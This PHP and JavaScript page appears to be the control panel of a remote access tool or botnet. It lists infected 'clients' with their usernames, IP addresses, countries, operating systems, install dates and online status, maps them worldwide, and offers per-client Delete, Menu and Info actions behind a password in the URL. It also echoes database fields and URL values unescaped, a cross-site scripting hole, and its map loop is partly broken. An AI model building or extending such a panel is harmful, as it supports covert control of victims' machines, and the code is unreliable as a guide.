<?php
	include("chk.php");
?>
	<link href="flags/css/flag-icon.css" rel="stylesheet">
		 <script type="text/javascript">        
            window.onload = function () {
				var current = null;
				var map = {};
				var m = {};				
				var attr = {
					fill: "#333",
					stroke: "#888",
					"stroke-width": .5,
					"stroke-linejoin": "round"
				};				
				var map = {};
				
				var width = document.getElementById('holder_1000').style.width;
				var height = document.getElementById('holder_1000').style.height * 0.99;

				var svgHeight = 400;
			    var svgWidth = 1000;

				var R = Raphael("holder_1000", "100%", "100%");
				
				R.setViewBox(0, 0, svgWidth, svgHeight, true);

				render_map(R,map,attr);		
				for (var state in map) {							        
    	            map[state].color = Raphael.getColor();
	                (function (st, state) {
						st[0].style.cursor = "pointer";
						st[0].onmouseover = function () {
							current && map[current].animate({fill: "#333", stroke: "#666"}, 300);
							st.animate({fill: st.color, stroke: "#ccc"}, 300);
							R.safari();
							current = state;
						};
						st[0].onmouseout = function () {
							st.animate({fill: "#333", stroke: "#666"}, 300);
							R.safari();
						};
						
					})(map[state], state);
				}; // end for
				
				

				function lon2x(lon) {
					var xfactor = 2.752;
					var xoffset = 473.75;
					var x = (lon * xfactor) + xoffset;
					return x;
				}
				function lat2y(lat) {
					var yfactor = -2.753;
					var yoffset = 231;
					var y = (lat * yfactor) + yoffset;
					return y;
				}

				var city_attr = {
					fill: "#0f0",
					stroke: "none",
					opacity: .3
				};
				function plot(lat,lon,size) {
					size = size * .5 + 4;
					return R.circle(lon2x(lon), lat2y(lat), size).attr(city_attr);
				}


				var cities = {};
				
				<?php showclinets(0); ?>


				var current_city = null;
				var city_box = null;
				for (var city in cities) {							        
    	            map[state].color = Raphael.getColor();
	                (function (st, city) {
						st[0].style.cursor = "pointer";
						st[0].onmouseover = function () {
							current_city && cities[current_city].animate({fill: "#0f0", opacity: .3}, 300);
							st.animate({fill: "#0f0", opacity: 1}, 300);
							R.safari();
							current_city = city;
						};
						st[0].onmouseout = function () {
							st.animate({fill: "#0f0", opacity: .3}, 300);
							R.safari();
						};
						
						st[0].onclick = function () {
							if (t = document.getElementById(city_box)) { t.style.display = "none"; }
							if (t = document.getElementById(city)) { t.style.display = "block"; }
							city_box = city;
						};


						if (t = document.getElementById(city)) {
								t.style.left = cities[city].attr('cx') + 'px';
								t.style.top = cities[city].attr('cy') -20 + 'px';
						}

					})(cities[city], city);
				}; // end for


			};
        </script>
<div class="panel panel-default world">
		<div id="holder_1000" style="position:relative;height:500px;;"></div>
		
	<div class="form-group">
<form action="" method="post">
	<label style="margin-left:+20px;"> Start row:</label><input value="0" type="text"  style="width:60px;" class="form-control" name="lm1">
	<label style="margin-left:+20px;"> Number of rows:</label><input value="30" type="text"  style="width:60px;" class="form-control" name="lm2">
	<label>Status:</label>
		<select class="form-control" name="status">
			<option>All</option>
			<option>Online</option>
			<option>Offline</option>
			<option>Dead</option>
		</select>
	<label>Sort:</label>
		<select class="form-control" name="sort">
			<option>ascending</option>
			<option>descending</option>
		</select>
		<input type="submit" value="Sort" class="btn btn-primary">
</form>
		</div>
	</div>
	<div class="panel panel-default clinet">
		<table class="table table-bordered" >
			<thead >
			<tr>
				<th>Name</th>
				<th>ID</th>
				<th>Username</th>
				<th>IP</th>
				<th>Location</th>
				<th>Operating System</th>
				<th>Install Date</th>
				<th>Status</th>
				<th>Options</th>
			</tr>
			</thead>
			<tbody >
					<?php showclinets(1);?>
			</tbody>
		</table>
	</div>
<?php
	function showclinets($echoo)
	{
include("../config.php");
		$con=mysql_connect($host,$user,$pass);
		mysql_select_db($db,$con);
		$lm1="0";
		$lm2="30";
		$filter="DESC";
		if(isset($_POST["lm1"]))
		{
			$lm1=(int)$_POST['lm1'];
			$lm2=(int)$_POST['lm2'];
		}
		if(isset($_POST['sort']))
		{
			if($_POST['sort']=="ascending"){$filter="ASC";}
			
		}
		if($echoo==1)
		{
			if(isset($_POST['status']))
			{
			$sql = "SELECT * FROM `buser` ORDER BY `sid` ".$filter." LIMIT ".$lm1.", ".$lm2." ";
				if($_POST['status']=="Online") // online
				{
					$statuson=Date('y:m:d H:i:s', strtotime("-2 minutes"));
					$sql = "SELECT * FROM `buser` where sonline > '".$statuson."' ORDER BY `sid` ".$filter." LIMIT ".$lm1.", ".$lm2." ";
				}
				elseif($_POST['status']=="Offline")
				{
					$statusoff=Date('y:m:d H:i:s', strtotime("-2 minutes"));
					$statusoff2=Date('y:m:d H:i:s', strtotime("-10 days"));
					
					$sql = "SELECT * FROM `buser` where sonline < '".$statusoff."' and sonline > '".$statusoff2."' ORDER BY `sid` ".$filter." LIMIT ".$lm1.", ".$lm2." ";
				}
				elseif($_POST['status']=="Dead")
				{
					$statusdead=Date('y-m-d H:i:s', strtotime("-7 days"));
					$sql = "SELECT * FROM `buser` where sonline < '".$statusdead."' ORDER BY `sid` ".$filter." LIMIT ".$lm1.", ".$lm2." ";
				}
				
			}
			else
			{
				$sql = "SELECT * FROM `buser` ORDER BY `sid` ".$filter." LIMIT ".$lm1.", ".$lm2." ";
			}
		}
		elseif($echoo==0)
		{
			$sql="select * from buser";
		}
		$sel=mysql_query($sql);
		while($row=mysql_fetch_array($sel))
		{
		if($echoo==1)
		{
		
			echo "<tr> \n"."<td>".$row['sname']."</td> \n";
			echo "<td>".$row['sid']."</td> \n ";
			echo "<td>".$row['susername']."</td> \n ";
			echo "<td>".$row['sip']."</td> \n ";
			echo "<td><center><span style='font-size: 150%;' class='flag-icon flag-icon-".$row['slocation']."' ></span></center></td> \n ";
			$os=$row['sops'];
			echo "<td>".$os."</td> \n ";
			echo "<td>".$row['sinstall']."</td> \n ";
			$statususer=$row['sonline'];
			if(isset($_POST['status']))
			{
				if($_POST['status']=="Online"){$statususer="Online";}
				if($_POST['status']=="Offline"){$statususer="Offline";}
				if($_POST['status']=="Dead"){$statususer="Dead";}
			}
			echo "<td>".$statususer."</td> \n ";
			echo "<td><center><a href='?pass=".$_GET['pass']."&page=delete&user=".$row['sname']."'>Delete</a>|<a href='?pass=".$_GET['pass']."&page=Menu&user=".$row['sname']."'>Menu</a>|<a href='?pass=".$_GET['pass']."&page=info&user=".$row['sname']."&ip=".$row['sip']."'>Info</a></center></td>";
			echo "</tr>";
			}
			elseif($echoo==0)
			{
				if($row['sloc']!="")
				{
					echo "cities.as=plot(".$row['sloc'].",1);";
				}
			}
		}	
		mysql_close($con);
		
	}
	

?>